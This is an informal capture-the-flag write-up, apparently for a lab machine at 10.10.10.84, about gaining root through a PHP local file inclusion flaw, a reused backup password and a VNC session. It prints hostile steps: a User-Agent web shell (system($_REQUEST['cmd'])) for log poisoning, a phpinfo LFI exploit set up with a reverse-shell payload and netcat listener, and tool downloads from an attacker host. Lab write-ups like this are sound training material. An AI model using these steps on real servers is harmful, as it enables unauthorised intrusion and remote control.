	tight VNC
	---------

nmap -sC -sV 10.10.10.84

port 22 ssh is open > FreeBSD

port http open:
---------------
in the web page got severale .php file > check them out ----> in the listfiles.php we see a list of files, pwdbackup.txt is interasting: a 13 * base64 encoded password 
in the phpinfo.php we want to check the 'file upload' func, we see we could upload files and the path the file will be uploded.


the main web page sende the user input > in the response we see the server tries to run the input in an 'include()' func..
so if send for example: index.php we get a legit response----> index.php page
/browser.php?file=php://filter/convert.base64-encode/resource=index.php ----> this will convert the response to base64 - it means that apache wont read this '<?php ?>' tags

convert base64 to readable formt : echo -n <base64_text> | base64 -d

/browser.php?file=php://filter/convert.base64-encode/resource=ini.php

its basicly a LFI:
------------------
/browser.php?file=/etc/passwd

only 2 users active: root & charix 

ssh to charix@10.10.10.x
*use decoded password found in pwdbackup.txt

we see a secret.zip file
transfer to host with ssh ---> on host machine: scp charix.10.10.10.84:secret.zip .
*** seems like dead end ***

transfer LinEnum.sh to victmws tmp directory : 
on host > python -m SimpleHTTPServer 80
on victinm> wget 10.10.14.15:80/LinEnum.sh
*** dead end ***

on victim machine: netstat -tapn ---> we see port 5901 - a VNCport
the secret.zip is the password to VNC login : vncviewr --passwd secret <ip_address>:<port>

R O O T E D ! ! ! 


* serach google for 'phpinfo lfi':
----------------------------------

1. in phpinfo.php page search 'PHP Varlables' ----> we can inject to _FILES() + check other objects for get right parameters to correct requests sending
2. create a buro request:

POST /phpinfo.php
.
.
.
.
Content-Type: multipart/form-data; boundary=--PleaseSubscribe
Content-Lenght= 177

----PleaseSubscribe
COntent-Disposition: form-data; name="anything"; filename="LeaveAcomment"
Content-Type: text/plain

PLease bla bla
----PleaseSubscribe

way 1:
------

log poison
==========
1. in the main web page insert /var/log/httpd-access.log
2. in burp :
A-test)
GET /anyPageDosentMatters
.
.
.
User-Agent:<?php echo('katomi'); ?>
. 
.
.
B)
GET /anyPageDosentMatters
.
.
.
User-Agent:<?php system($_REQUEST['cmd']); ?>
. 
.
.

3. run command execution in url calling the logs path lfi with &cmd= parameter

way 2:
-------
3.search in google: payload all the things github ---> go to 'file inclusion path traversla' > phpinfolfi.py > download
modify exploit:
PAYLOAD = <put php reverse shell payload> ----> in the payload change $ip & $port
LFIREQ="""GET /<changetoOurPath> --->/browser.php?file=%s
**run exploit: ---> python exploit.py 10.10.10.84 80 100
on host : nc -lvnp <port>

